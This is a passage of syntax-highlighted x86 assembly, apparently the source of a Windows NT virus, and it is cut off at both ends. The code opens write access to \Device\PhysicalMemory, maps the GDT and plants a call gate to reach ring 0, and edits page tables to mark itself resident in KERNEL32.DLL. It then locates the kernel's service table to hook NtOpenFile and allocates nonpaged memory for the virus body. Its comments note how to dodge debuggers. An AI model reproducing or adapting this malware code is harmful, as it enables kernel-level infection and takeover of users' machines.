                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pSecurityDescriptor</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pDacl</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">DACL_SECURITY_INFORMATION</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SE_KERNEL_OBJECT</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyhSection</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetSecurityInfo</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; we get security info for \Device\PhysicalMemory</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pNewAcl</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pDacl</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyEXPLICIT_ACCESS</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetEntriesInAclA</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; we add write permission to \Device\PhysicalMemoryïs permission list</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pNewAcl</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">DACL_SECURITY_INFORMATION</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SE_KERNEL_OBJECT</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyhSection</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetSecurityInfo</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; and we set the new permission list</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pNewAcl</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LocalFree</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; we free no longer needed mem block</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pSecurityDescriptor</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LocalFree</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; we free no longer needed mem block</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyhSection</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; we close object handle</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyOBJECT_ATTRIBUTES</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyEXPLICIT_ACCESS</span><span class="sc4">+</span><span class="sc5">EXPLICIT_ACCESS.grfAccessPermissions</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyhSection</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NtOpenSection</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; and we reopen it with new security attributes ;D</span><span class="sc0">
                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; STATUS_SUCCESS ?</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">        </span><span class="sc1">; if not, exit.</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyGDTR</span><span class="sc4">+</span><span class="sc5">GDTR.Base</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">00000FFFh</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1FFFF000h</span><span class="sc0">
                                </span><span class="sc1">; We have to map real/physical mem starting from a page aligned address,</span><span class="sc0">
                                </span><span class="sc1">; even if we are accessing nonaligned data later on.</span><span class="sc0">
                                </span><span class="sc1">; Thatïs why weïll save 12 bit offset ( offset into the page )</span><span class="sc0">
                                </span><span class="sc1">; into EDI and we let eax aligned down to the page.</span><span class="sc0">
                                </span><span class="sc1">; Note that we also clear most significant bits... in NT kernel</span><span class="sc0">
                                </span><span class="sc1">; addresses near 80000000h can be treated as that,</span><span class="sc0">
                                </span><span class="sc1">; cos, Virtual==Linear and also Linear==Real+Base</span><span class="sc0">

                                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyGDTR</span><span class="sc4">+</span><span class="sc5">GDTR.Limit</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                                </span><span class="sc1">; for the same reason, we add the distance between real address </span><span class="sc0">
                                </span><span class="sc1">; and page boundary aligned address ( base to map from address )</span><span class="sc0">
                                </span><span class="sc1">; to the size of the memory we are going to map, even if we will</span><span class="sc0">
                                </span><span class="sc1">; access to the concrete offset later.</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; here we push SizeOfView</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; here we push SectionOffset with 64 bits, thats why we push ecx ( 0 ) too.</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; here we push BaseAddress ( 0: "no preferred mapping base address" )</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; MEM_COMIT</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; UnmapView</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; lpViewSize</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; lpSectionOffset</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; CommitSize</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; ZeroBits</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; lpBaseAddress</span><span class="sc0">
                                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; ProcessHandle FFFFFFFFh is a pseudo handle ( current process )</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyhSection</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; hSection</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NtMapViewOfSection</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; we finally map Physical Memory }:&gt;</span><span class="sc0">

                                </span><span class="sc6">lodsd</span><span class="sc0">

                                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; we adjust the offset ( with the saved offset-into-page )</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AX=last available selector</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallGateSelector</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; we save the descriptor for that last selector</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; so that we can restore it later ( we arent gonna leave the descriptor there, are we? xD )</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ring0Code</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; we split the 32bit offset to our ring0 procedure into 16bit+16bit</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; we store low 16bits</span><span class="sc0">
                                </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; we store high 16bits</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">0008h</span><span class="sc0">   </span><span class="sc1">; Ring0 Code selector for Win NT.</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0EC00h</span><span class="sc0">  </span><span class="sc1">; 1 11 0 1100 0000 0000 &gt; PRESENT=1, DPL=11 ( accesible from Ring3 ), SYSTEM=0 ( Gate ), TYPE=1100 ( CallGate ), 000, WC=00000 ( Word Count to copy between stacks: 0 )</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">Virus_size_memory</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualLock</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; we lock the page cos we dont want to be swapped while in ring0</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Sleep</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; this might seem tricky, it just ends threads execution time slice, so that</span><span class="sc0">
                                                        </span><span class="sc1">; when the thread resumes execution it has the full time slice guaranteed</span><span class="sc0">

                                </span><span class="sc1">; We jump to our beloved ring0 ;)</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">9Ah</span><span class="sc0">  </span><span class="sc1">; call GSel:XXXXXXXXh ; The offset will simply be ignored, cos the selector is "pointing" to a callgate ( which specifies the offset by itslef ).</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">CallGateSelector</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc1">; here we returned from ring0 procedure ( with a retf ) so we are back in ring3</span><span class="sc0">

                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; we restore the saved descriptor</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">; we unlock the page ( not really needed... )</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualUnlock</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; we unmap the mapping</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">         </span><span class="sc1">; FFFFFFFFh is a pseudo handle ( current process )</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NtUnmapViewOfSection</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyhSection</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; and we close the mapping object</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">025h</span><span class="sc0">    </span><span class="sc1">; JMP [DWORD]</span><span class="sc0">
</span><span class="sc5">AddressOfExitProcessIntoIAT</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00402040h</span><span class="sc0">    </span><span class="sc1">; ExitProcess</span><span class="sc0">

</span><span class="sc1">; Ring0 Code</span><span class="sc0">

</span><span class="sc5">Ring0Code</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc6">cli</span><span class="sc0">
                                </span><span class="sc6">cld</span><span class="sc0">
                                </span><span class="sc6">pushad</span><span class="sc0">

                                </span><span class="sc1">;mov eax,cr0</span><span class="sc0">
                                </span><span class="sc1">;push eax</span><span class="sc0">
                                </span><span class="sc1">;and eax,0FFFEFFFFh      ; we clear WP ( Ring 0 write protection ENABLE/DISABLE ) bit to disable CopyOnWrite temporally };&gt;</span><span class="sc0">
                                </span><span class="sc1">;mov cr0,eax             ; also, a write violation in Ring0 doesnt mean CopyOnWrite, but BSOD xDDD, cos the exception is handled incorrectly...</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KERNEL32Base</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">              </span><span class="sc1">; we obtain the PTE for the given virtual address</span><span class="sc0">
                                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">003FFFFCh</span><span class="sc0">
                                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">40000000h</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">

                                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">     </span><span class="sc1">; we enable write access for that page };&gt;</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.e_csum</span><span class="sc4">],</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc12">'SH'</span><span class="sc0">     </span><span class="sc1">; we mark our residency in KERNEL32.DLL module</span><span class="sc0">

                                </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">

                                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">    </span><span class="sc1">; we disable write access back for that page</span><span class="sc0">

                                </span><span class="sc1">;pop eax</span><span class="sc0">
                                </span><span class="sc1">;mov cr0,eax             ; we restore original state of WP bit :D</span><span class="sc0">

                                </span><span class="sc6">sidt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyIDTR</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; we save base address of IDT so that we can access to it</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyIDTR</span><span class="sc4">+</span><span class="sc5">IDTR.Base</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+(</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; It could be 2Eh, but softice hooks that IntGate, so weïll use 2Ah ( 00h would be ok but BoundsChecker hooks it too ;( ),</span><span class="sc0">
                                </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">              </span><span class="sc1">; itïs just to use an IntGate whose handler resides into ntoskrnl.exe in memory.</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+(</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)]</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; mov eax,00001000h</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SolveModuleBase</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NTOSKRNLApiCalls</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NTOSKRNLApiCRC32s</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SolveModuleExports</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeServiceDescriptorTable</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; we obtain ServiceDescriptorTable address</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; we obtain NumberOfServices fieldïs value.</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NtOpenFile</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; and we search for NtOpenFileïs entry</span><span class="sc0">
                                </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasd</span><span class="sc0">
                                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

                                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ExitFromRing0Code</span><span class="sc0">         </span><span class="sc1">; if we fail to locate it, just exit...</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OffsetOfNtOpenFileAddressInSDT</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; prepare our hook function</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OffsetOfNtOpenFileAddressInSDT_</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OriginalNtOpenFileAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OriginalNtOpenFileHandler</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc1">; Allocate nonpaged ( totally locked safe memory )</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Tag ( nothing )</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">Virus_size_memory</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NonPagedPool</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExAllocatePoolWithTag</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

